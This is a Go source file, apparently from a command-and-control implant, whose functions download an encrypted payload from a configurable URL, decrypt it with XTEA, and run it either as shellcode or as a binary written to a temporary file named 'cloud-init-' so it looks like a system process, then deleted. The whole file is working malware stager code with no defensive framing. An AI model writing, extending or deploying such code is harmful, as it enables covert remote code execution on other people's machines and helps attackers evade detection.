package c2

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"github.com/b1gcat/core/pki"
)

// downloadPayload downloads the encrypted payload from the specified URL
func (c *C2) downloadPayload() ([]byte, error) {
	// Create a new request
	req, err := http.NewRequest("GET", c.URL, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Add basic authentication if username and password are set
	if c.Username != "" && c.Password != "" {
		req.SetBasicAuth(c.Username, c.Password)
	}

	// Send the request
	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to download payload: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("failed to download payload: received status code %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	return body, nil
}

// decryptPayload decrypts the payload using XTEA algorithm
func (c *C2) decryptPayload(encryptedPayload []byte) ([]byte, error) {
	if len(c.Key) != 16 {
		return nil, fmt.Errorf("invalid key length: expected 16 bytes, got %d bytes", len(c.Key))
	}

	decryptedPayload, err := pki.Decrypt(c.Key, encryptedPayload)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt payload: %w", err)
	}

	return decryptedPayload, nil
}

// executePayload executes the decrypted payload based on the first line
func (c *C2) executePayload(payload []byte) error {
	// Split payload into lines
	lines := bytes.Split(payload, []byte{'\n'})
	if len(lines) < 2 {
		return fmt.Errorf("invalid payload format: expected at least two lines")
	}

	// Get the execution type from the first line
	execType := strings.TrimSpace(string(lines[0]))
	// Get the actual payload content from the second line onwards
	payloadContent := bytes.Join(lines[1:], []byte{'\n'})

	switch execType {
	case "payload":
		// Execute as shellcode
		run(payloadContent)
		return nil
	case "binary":
		// Execute as binary file
		return c.executeBinary(payloadContent)
	default:
		return fmt.Errorf("unknown execution type: %s", execType)
	}
}

// executeBinary writes the payload to a temporary file and executes it
func (c *C2) executeBinary(binaryData []byte) error {
	// Create a temporary file
	tmpFile, err := os.CreateTemp("", "cloud-init-")
	if err != nil {
		return fmt.Errorf("failed to create temporary file: %w", err)
	}
	tmpFileName := tmpFile.Name()
	defer func() {
		os.Remove(tmpFileName) // Clean up the temporary file
	}()

	// Write the binary data to the temporary file
	if _, err := tmpFile.Write(binaryData); err != nil {
		tmpFile.Close()
		return fmt.Errorf("failed to write binary data to temporary file: %w", err)
	}
	tmpFile.Close()

	// Make the temporary file executable
	if err := os.Chmod(tmpFileName, 0755); err != nil {
		return fmt.Errorf("failed to make temporary file executable: %w", err)
	}

	// Execute the temporary file
	cmd := exec.Command(tmpFileName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to execute binary: %w, output: %s", err, output)
	}

	fmt.Printf("Binary execution output: %s\n", output)
	return nil
}
